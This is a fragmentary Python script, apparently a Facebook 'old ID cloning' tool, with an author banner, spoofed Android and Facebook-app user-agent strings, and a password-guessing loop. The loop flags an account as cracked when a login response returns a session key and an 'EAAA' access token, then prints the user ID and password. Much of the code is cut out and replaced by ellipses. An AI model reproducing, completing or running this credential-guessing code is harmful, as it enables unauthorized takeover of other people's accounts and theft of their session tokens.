__Tools Owner PIYUSH CHAUHAN 
# https://github.com/PiyushA2Ztricks
...
\033[1;91m█▀▀ █ ░█░ █▄█ ▄█ █▀█                  
▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
▇➤ Author        : RAWAN URF DEVA THAKUR
▇➤ Github        : RAWAN URF DEVA THAKUR
▇➤ Status        : FREE
▇➤ TEAM          : ONLY FOR RAWAN 
▇➤ UPDATE BY     : RAWAN THAKUR
▇➤ Tools  Name   : OLD ID CLONING 
▇➤ version       : 10.5
▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
  (𝐀𝐋𝐋 𝐑𝐎𝐖𝐍𝐃𝐄𝐑 𝐑𝐀𝐖𝐀𝐍 𝐓𝐇𝐀𝐊𝐔𝐑 𝐇𝐄𝐀𝐑) 
▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇""" ) 
...
"Mozilla/5.0 (Linux; Android 12;  CPH2195 Build/S970M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4373.79 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12;  CPH2195 Build/S970M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4373.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;] ",
"Mozilla/5.0 (Linux; Android 12;  CPH2195 Build/S970M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4373.79 Mobile Safari/537.36"
		])
...
"Mozilla/5.0 (Linux; Android 12;  CPH2195 Build/S970M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4373.79 Mobile Safari/537.36"
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[ PIYUSH-OKK ] %s | %s\033[0;97m         "%(uid, pw))
